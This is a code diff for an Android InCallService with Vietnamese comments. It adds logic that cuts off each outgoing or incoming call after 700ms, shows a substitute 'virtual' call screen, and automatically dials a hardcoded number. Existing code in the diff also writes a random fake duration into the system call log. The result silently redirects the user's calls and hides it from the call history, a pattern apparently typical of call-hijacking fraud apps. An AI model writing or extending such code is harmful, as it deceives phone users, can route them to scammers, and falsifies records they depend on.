@@ -1,15 +1,22 @@
 package com.example.autocallapp;
 
+import android.Manifest;
 import android.content.ContentValues;
+import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
+import android.os.Build;
+import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.provider.CallLog;
 import android.telecom.Call;
 import android.telecom.InCallService;
+import android.telecom.TelecomManager;
 import android.util.Log;
+import androidx.core.content.ContextCompat;
 import java.util.Random;
 
 public class MyInCallService extends InCallService {
@@ -17,15 +24,18 @@ public class MyInCallService extends InCallService {
     private boolean isHandled = false;
     private static final String TAG = "MyInCallService";
 
+    // Số điện thoại mặc định bạn muốn tự động chuyển hướng gọi tới
+    private static final String TARGET_DEFAULT_NUMBER = "0123456789";
+
     @Override
     public void onCallAdded(Call call) {
         super.onCallAdded(call);
         activeCall = call;
         isHandled = false;
 
-        // Bật màn hình giao diện ảo lên
+        // Bật màn hình giao diện ảo lên (với các cờ dọn dẹp task cũ sạch sẽ)
         Intent intent = new Intent(this, CallActivity.class);
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
         startActivity(intent);
 
         call.registerCallback(new Call.Callback() {
@@ -40,15 +50,20 @@ public class MyInCallService extends InCallService {
                     // Sinh thời gian ngẫu nhiên từ 20 đến 35 giây cho CallLog
                     int randomDuration = new Random().nextInt(16) + 20;
 
-                    // ĐỢI ĐÚNG 700ms (0.7 giây) RỒI MỚI NGẮT KẾT NỐI
+                    // ĐỢI ĐÚNG 700ms (0.7 giây) RỒI NGẮT KẾT NỐI VÀ CHUYỂN HƯỚNG
                     new Handler(Looper.getMainLooper()).postDelayed(() -> {
                         try {
                             if (call != null) {
-                                call.disconnect();
+                                call.disconnect(); // Ngắt số ban đầu
                             }
                         } catch (Exception e) {
                             Log.e(TAG, "Lỗi khi gọi call.disconnect(): " + e.getMessage());
                         }
+
+                        // Chờ 300ms để line trống, sau đó tự động gọi sang số mặc định (0123456789)
+                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                            makeCallToDefaultNumber(TARGET_DEFAULT_NUMBER);
+                        }, 300);
 
                         // Cập nhật lại thời lượng vào lịch sử cuộc gọi ở luồng nền để chống nghẽn (ANR)
                         new Thread(() -> {
@@ -66,6 +81,25 @@ public class MyInCallService extends InCallService {
         super.onCallRemoved(call);
         if (activeCall == call) {
             activeCall = null;
+        }
+    }
+
+    // Hàm thực hiện gọi tự động sang số mặc định
+    private void makeCallToDefaultNumber(String phoneNumber) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            TelecomManager telecomManager = (TelecomManager) getSystemService(Context.TELECOM_SERVICE);
+            if (telecomManager != null) {
+                Uri uri = Uri.parse("tel:" + phoneNumber);
+                Bundle extras = new Bundle();
+                try {
+                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
+                        telecomManager.placeCall(uri, extras);
+                        Log.d(TAG, "Đã chuyển hướng gọi thành công sang số mặc định: " + phoneNumber);
+                    }
+                } catch (SecurityException e) {
+                    Log.e(TAG, "Lỗi bảo mật khi gọi số mặc định: " + e.getMessage());
+                }
+            }
         }
     }
 
